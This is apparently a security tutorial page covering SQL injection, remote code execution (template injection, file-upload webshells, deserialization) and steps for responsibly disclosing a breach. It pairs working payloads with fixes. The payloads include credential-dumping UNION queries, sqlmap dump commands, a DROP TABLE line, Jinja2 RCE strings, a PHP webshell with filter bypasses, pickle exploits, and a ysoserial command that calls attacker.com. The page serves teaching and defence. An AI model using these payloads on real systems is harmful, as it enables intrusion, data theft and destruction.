📊 SQL Injection
CWE-89 • In-band, Blind, Error-based, Time-based • OWASP A03:2021
High ⌄

SQLi occurs when user input is concatenated directly into SQL queries. An attacker can dump entire databases, bypass authentication, or in some configurations achieve remote code execution via xp_cmdshell (MSSQL) or INTO OUTFILE (MySQL).

Classic login bypass
# Login form with vulnerable backend: Username: admin'-- Password: (anything) # Constructed query: SELECT * FROM users WHERE username='admin'--' AND password='anything' # -- comments out the password check → logs in as admin # Variations: admin' OR '1'='1'-- # always true ' OR 1=1-- # first user in table (often admin) '; DROP TABLE users;-- # destructive — never do in prod
# Step 1 — Find column count: https://lab.target/item?id=1 ORDER BY 1-- ✓ https://lab.target/item?id=1 ORDER BY 2-- ✓ https://lab.target/item?id=1 ORDER BY 3-- ✗ error → 2 columns # Step 2 — UNION to extract DB version: ?id=-1 UNION SELECT @@version,null-- # Step 3 — List all tables: ?id=-1 UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema=database()-- # Step 4 — Dump credentials: ?id=-1 UNION SELECT username,password FROM users--
# Automate with sqlmap (authorized targets only): sqlmap -u "https://lab.target/item?id=1" \ --dbs --batch --level=3 --risk=2 # Dump specific table: sqlmap -u "https://lab.target/item?id=1" \ -D mydb -T users --dump --batch
# No output visible — infer data from true/false responses: # Boolean-based: ?id=1 AND 1=1 → page loads (true) ?id=1 AND 1=2 → blank/error (false) # Extract admin password one character at a time: ?id=1 AND SUBSTRING( (SELECT password FROM users WHERE username='admin'),1,1 )='a' → true? first char is 'a' # Time-based (no visible difference in response): ?id=1; IF(1=1, SLEEP(5), 0)-- → 5 second delay = condition is true ?id=1; IF(SUBSTRING( (SELECT password FROM users LIMIT 1),1,1 )='a', SLEEP(5), 0)--
✅
The only real fix: Parameterized queries / prepared statements. WAFs are defense-in-depth, not a replacement.
// WRONG — vulnerable concatenation: const q = "SELECT * FROM users WHERE id=" + req.params.id; // RIGHT — parameterized (Node.js + mysql2): const [rows] = await db.execute( "SELECT * FROM users WHERE id = ?", [req.params.id] ); // Python + psycopg2: cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,)) // Java PreparedStatement: PreparedStatement ps = conn.prepareStatement( "SELECT * FROM users WHERE id = ?" ); ps.setInt(1, userId);

💻 Remote Code Execution (RCE)
CWE-94 • SSTI, File Upload, Deserialization • CVSS up to 10.0
Critical ⌄

RCE is the worst class of vulnerability — full control of the target server with no physical access required. A single RCE on a cloud server can expose every customer's data.

Server-Side Template Injection — Jinja2 (Python/Flask)
# Step 1 — Detect SSTI (safe math test): Input: {{7*7}} Output: 49 ← template evaluated our expression = SSTI confirmed # Step 2 — Identify engine (Jinja2 vs Twig vs Freemarker): {{7*'7'}} → '7777777' = Jinja2 / Twig ${7*7} → 49 = Freemarker / Velocity # Step 3 — Full RCE on Jinja2 (lab environment only): {{config.__class__.__init__.__globals__['os'] .popen('id').read()}} → uid=33(www-data) gid=33(www-data) # Shorter payload: {{''.__class__.mro()[1].__subclasses__()[396] ('id',shell=True,stdout=-1).communicate()[0]}}
# File upload bypass — get a webshell onto server: # Basic PHP webshell payload (shell.php): <?php system($_GET['cmd']); ?> # Bypass extension filter — null byte trick: Filename: shell.php%00.jpg ← old PHP <5.3 # Bypass MIME-type check — spoof Content-Type: Content-Type: image/jpeg ← server checks this, not actual content # Double extension bypass: Filename: shell.php.jpg ← some servers execute .php regardless # Magic bytes bypass — prepend JPEG header: FF D8 FF E0 <?php system($_GET['cmd']); ?> # After successful upload, trigger execution: https://lab.target/uploads/shell.php?cmd=whoami
# Java deserialization — ysoserial gadget chains (lab only): # Generate malicious serialized payload: java -jar ysoserial.jar CommonsCollections6 \ 'curl https://attacker.com/pwned' | base64 # Send as cookie or POST body where server deserializes Java objects # PHP object injection: O:8:"UserPref":1:{s:4:"theme";s:19:"../../../etc/passwd"} # If class has __toString or __wakeup with file read → path traversal / RCE # Python pickle (never unpickle untrusted data): import pickle, os class Exploit(object): def __reduce__(self): return os.system, ('id',) pickle.dumps(Exploit()) # → sends this → server executes 'id'
# SSTI fix — never pass user input directly to render(): return render_template_string(user_input) # WRONG return render_template('page.html', name=user_input) # RIGHT # File upload fix — validate by magic bytes, not extension: import magic mime = magic.from_buffer(file.read(1024), mime=True) ALLOWED = {'image/jpeg', 'image/png', 'image/gif'} if mime not in ALLOWED: abort(400) # Store uploads outside webroot so they can't be executed: UPLOAD_DIR = '/var/uploads/' # not inside /var/www/html/ # Deserialization fix — replace with safe format: obj = pickle.loads(data) # WRONG obj = json.loads(data) # RIGHT — JSON has no code execution

📊 Data Breach Discovery
Finding & responsibly disclosing large-scale exposures • CBSE case study preview
Critical ⌄

Discovering that a live system has exposed millions of records is a critical moment. What you do in the next 60 minutes determines whether you become a criminal or a hero.

1
Stop immediately — document minimally
Take 1–2 screenshots proving the vulnerability. Do NOT download bulk data, do NOT access more than necessary to prove the flaw exists.
2
Write a clear, professional report
URL/endpoint, steps to reproduce, one proof screenshot, severity, and your recommended fix. No demands, no threats.
3
Report to CERT-In + organization
Email: incident@cert-in.org.in for any Indian government system. For private companies, find security.txt or their bug bounty program.
4
Wait 90 days — then consider disclosure
Industry standard is 90 days for the org to patch before you go public. For Indian government targets, consult a lawyer before any public disclosure.
